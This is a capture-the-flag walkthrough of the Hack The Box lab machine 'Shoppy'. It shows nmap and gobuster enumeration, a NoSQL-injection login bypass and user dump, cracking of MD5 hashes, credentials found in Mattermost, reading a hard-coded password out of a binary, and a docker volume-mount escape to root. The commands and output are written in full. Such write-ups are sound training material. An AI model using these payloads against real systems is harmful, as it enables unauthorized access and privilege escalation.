## Enumeration

```
$ sudo nmap -T4 10.10.11.180
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-19 10:32 PST
Nmap scan report for 10.10.11.180
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
```

```
$ sudo nmap -T4 10.10.11.180 -p22,80 -A
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-19 10:33 PST
Nmap scan report for 10.10.11.180
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   84.34 ms 10.10.14.1
2   84.43 ms 10.10.11.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
```

- Add `machine_ip shoppy.htb` into `/etc/hosts`.
- After browsing `http://shoppy.htb`, there is only a countdown page. And thus, we want to try to enumerate the domain.

```
 gobuster dir -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/19 10:39:11 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/Login                (Status: 200) [Size: 1074]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/Admin                (Status: 302) [Size: 28] [--> /login]
/exports              (Status: 301) [Size: 181] [--> /exports/]
/LogIn                (Status: 200) [Size: 1074]
/LOGIN                (Status: 200) [Size: 1074]
Progress: 220367 / 220561 (99.91%)===============================================================
2022/12/19 10:44:46 Finished
===============================================================
```

- Go to `http://shoppy.htb/login`, and test it a little bit.
- We now try SQL injection

## SQL Injection

- Add some special characters, `'"()$` to our payload. And we found out that it responded with gateway timeout. It could be a sign of SQL injection by syntax error.

- Run auto injection test.

```
$ ffuf -u http://shoppy.htb/login -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'                                                                                                                                                             130 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://shoppy.htb/login
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=adminFUZZ&password=admin
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

{$nin: [""]}}           [Status: 302, Size: 51, Words: 4, Lines: 1, Duration: 154ms]
{"$gt": ""}             [Status: 302, Size: 51, Words: 4, Lines: 1, Duration: 464ms]
db.injection.insert({success:1}); [Status: 302, Size: 51, Words: 4, Lines: 1, Duration: 464ms]
|| 1==1                 [Status: 302, Size: 51, Words: 4, Lines: 1, Duration: 472ms]
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 [Status: 302, Size: 51, Words: 4, Lines: 1, Duration: 482ms]
' || 'a'=='a            [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 489ms]
```
 
-  Then, `' || 'a'=='` returns a response of different size.

- After logging in using username `admin' || 'a'=='a`, there is a page called `search-users` inside the admin portal.
- We can use the same injection (`admin' || 'a'=='a`) to get all users.

```
[
    {"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}
]
```

- We used the credentials to log in but failed. It means that the password field is hashed by md5 algorithm.
  1. We can try `https://crackstation.net/` and `https://hashes.com/en/decrypt/hash` first. We successfully got the password of `josh` as `remembermethisway`.
  2. We tried `john` to crack the admin's password. Unfortunately, it failed.


## Virtual Host Enumeration

```
$ffuf -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shoppy.htb" -fs 169 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 169
________________________________________________

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 91ms]
:: Progress: [100000/100000] :: Job [1/1] :: 444 req/sec :: Duration: [0:03:44] :: Errors: 0 ::
```

- After getting `mattermost` as a subdomain, we add `mattermost.shoppy.htb` into `/etc/hosts`.
- We used `josh:remembermethisway` as the credential to log in.
- In the `Deploy Machine` channel, we found another credential `jaeger:Sh0ppyBest@pp!`. We used this credential to access ssh service.


## PE

- Run `sudo -l`

```
jaeger@shoppy:~$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

- Run `sudo -u deploy /home/deploy/password-manager`. However, it asked for the password.

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password:
```

- Since `/home/deploy/password-manager` allows guest user to access, we can try to analyze the program. And we found `Please enter your master password: SampleAccess granted!`, and thus `Sample` could be the password.

```
cat /home/deploy/password-manager
ELF> @H@@8
          @@@@h���`
                   `
                    ��   ���-�=�=�P�-�=����DDP�td� � � LLQ�tdR�td�-�=�=PP/lib64/ld-linux-x86-64.so.2GNU@
)�GNU�▒�e�ms��                                                                                          .�Ҵ��43H
              C-�����fFr�S�w �� , N�"�▒�A▒#▒�@__gmon_start___ITM_deregisterTMCloneTable_ITM_registerTMCloneTable_ZNSaIcED1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ZSt3cin_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3__ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc_ZNSt8ios_base4InitD1Ev_ZNSolsEPFRSoS_E__gxx_personality_v0_ZNSaIcEC1Ev_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_ZNSt8ios_base4InitC1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev_ZSt4cout_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4__ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE_Unwind_Resume__cxa_atexitsystem__cxa_finalize__libc_start_mainlibstdc++.so.6libgcc_s.so.1libc.so.6GCC_3.0GLIBC_2.2.5CXXABI_1.3GLIBCXX_3.4GLIBCXX_3.4.21( P&y
                                                                                                                                                                                                                  @6 u▒i        HӯkTt)_q��k��4����@�?�?�?�?�?�?�?�@�@▒�A▒@ @(@0@8@@@HP@ X@
`@
  h@
x@�@H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h�p����%�/�`����%�/h      �P����%�/h
�@����%�/h
          �0����%�/h
H�=���.�DH�=I/H�B/H9�tH�n.H��t  �����H�=/H�5/H)�H��H��?H��H�H��tH�E.H����fD���=11u/UH�=�-H��t
���H��H�S,H��H������H�E�H�������H�E�H����������<H��H�E�H��������H��H�E�H���w����H��H�E�H���f���H��H�����h����   1]�����{���UH��SH��XH�5�
                                                                                                      ���H�]���UH��H���}��u��}�u2�}���u)H�=�.�����H�u,H�5�.H��+H���/������UH�����������]��AWL�=W)AVI��AUI��ATA��UH�-P)SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !@����0����@���h%����
```

- Then, we can get the deploy's credential `deploy:Deploying@pp!`

```
$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

- After changing the user as `deploy` by running `su deploy`, we can run `/home/jaeger/linpeas.sh` again to check the vulnerability.

```
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

- We found out that the user can run docker command, and `docker images` showed that `alpine` exists.

```
$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   5 months ago   5.53MB
```

- After googling, we got this [Docker Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounted-docker-socket-escape).

```
$ docker run -it -v /:/host/ alpine chroot /host/ bash
root@5f7c6e049ffd:/# whoami 
root
```

